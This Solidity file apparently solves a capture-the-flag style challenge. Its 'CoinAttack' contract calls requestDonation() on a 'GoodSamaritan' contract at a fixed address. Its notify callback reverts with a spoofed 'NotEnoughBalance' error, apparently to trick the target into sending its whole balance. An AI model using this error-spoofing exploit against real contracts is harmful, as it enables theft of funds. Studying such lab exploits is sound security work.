// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GoodSamaritan.sol";

interface INotifyable {
    function notify(uint256 amount) external;
}

contract CoinAttack is INotifyable {
    error NotEnoughBalance();

    GoodSamaritan gs =
        GoodSamaritan(0xdB4BfaB93C4CeB136029F2825496a658d7001A6f);

    function attack() external {
        gs.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
